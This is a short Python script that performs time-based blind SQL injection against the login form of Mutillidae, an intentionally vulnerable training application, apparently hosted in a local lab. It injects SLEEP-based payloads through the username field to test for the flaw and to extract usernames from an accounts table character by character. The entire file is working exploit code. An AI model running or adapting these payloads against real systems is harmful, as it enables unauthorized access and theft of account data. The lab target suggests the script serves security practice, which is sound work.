#!/bin/python

import string
import requests
from ..sqli_helper import SqliHelper, MySqlConfig

# config
sleep_duration = 1

# payload execution configuration
def exec_request(request: str) -> bool:
    url = "http://meta.local/mutillidae/index.php?page=login.php"
    datas = {
        'username': f"test' AND {request} #",
        'password': "pass",
        'login-php-submit-button': "Login",
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    res = requests.post(url, data=datas, headers=headers)
    print(f"[PAYLOAD] {request} in {res.elapsed.seconds} secs")
    return res.elapsed.seconds >= sleep_duration

# Method 1 : check for the current request
rq = "SELECT username FROM accounts ORDER BY username LIMIT 1,1"
helper = SqliHelper(MySqlConfig(), exec_request)
template_for_extract_string = string.Template(
    f'(SELECT 1 FROM (SELECT(SLEEP(IF(ORD(MID(($request),$index,1))$test,{sleep_duration},0))))a)'
)
helper.prepare_new(template=template_for_extract_string)
if(helper.check(rq)):
    print("Target is Vulnerable")
else:
    print("Target is not Vulnerable")

# if the request is invalid, the check fail
rq = "SELECT username FROM invalid_table ORDER BY username LIMIT 1,1"
if(helper.check(rq)):
    print("Target is Vulnerable")
else:
    print("Target is not Vulnerable")

# Method 2 : generic check
template_for_check = string.Template(f'(SELECT 1 FROM (SELECT(SLEEP({sleep_duration})))a)')
if(helper.check(template=template_for_check)):
    print("Target is Vulnerable")
else:
    print("Target is not Vulnerable")
